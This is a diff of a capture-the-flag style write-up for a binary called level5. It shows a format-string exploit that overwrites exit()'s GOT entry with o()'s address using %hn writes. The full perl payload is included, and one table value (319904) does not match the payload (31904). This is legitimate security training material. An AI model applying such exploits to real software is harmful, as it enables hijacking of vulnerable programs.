@@ -1,6 +1,6 @@
 # Level 5
 
-## ./level5 code:
+## `./level5` code:
 
 ```c
 //----- (080484A4) --------------------------------------------------------
@@ -28,15 +28,16 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 }
 ```
 
-## goal:
+## Goal:
 
-use the printf(s) to change in the GOT table exit() address by o() address. We will write the o() address where exit() address is stored.
+- Use `printf(s)` to change in the GOT table the `exit()` address by `o()` address.
+- We will write the `o()` address where `exit()` address is stored.
 
-## o() address:
+## `o()` address:
 
-on the local computer:
+- on our local computer:
 
-```sh
+```console
 $ nm level5
     [...]
 08048504 T main
@@ -48,11 +49,11 @@ $ nm level5
          U system@@GLIBC_2.0
 ```
 
-o() address is 0x080484a4
+- `o()` address is 0x080484a4.
 
-## exit() address in the GOT table
+## `exit()` address in the GOT table
 
-```sh
+```console
 $ objdump -R level5
 
 level5:     file format elf32-i386
@@ -70,20 +71,20 @@ OFFSET   TYPE              VALUE
 0804983c R_386_JUMP_SLOT   __libc_start_main
 ```
 
-exit() address is located at 0x08049838
+- `exit()` is located at 0x08049838
 
-## finding the buffer offset
+## Finding the buffer offset
 
-```sh
+```console
 $ ./level5 <<< $(perl -e 'print "AAAA" . ".%08x" x 7')
 AAAA.00000200.b7fd1ac0.b7ff37d0.41414141.3830252e.30252e78.252e7838
 ```
 
-buffer offset is 4
+- Buffer offset is 4
 
-## %hn magic number
+## `%hn` magic number
 
-0x080484a4 will be written in 2 blocks: 0804, 84a4 at address 0x0804983a and 0x08049838 (little endian)
+- 0x080484a4 will be written in 2 blocks: 0804, 84a4 at the respective addresses 0x0804983a and 0x08049838 (little endian).
 
 | format | high |    low |
 | :----: | :--: | -----: |
@@ -92,6 +93,8 @@ buffer offset is 4
 | offset |  -8  |  -2052 |
 | magic  | 2044 | 319904 |
 
-## the hack:
+## The Hack:
 
+```console
 (perl -e 'print "\x3a\x98\x04\x08" . "\x38\x98\x04\x08" . "%2044x%4\$hn" . "%31904x%5\$hn"' ; cat) | ./level5
+```
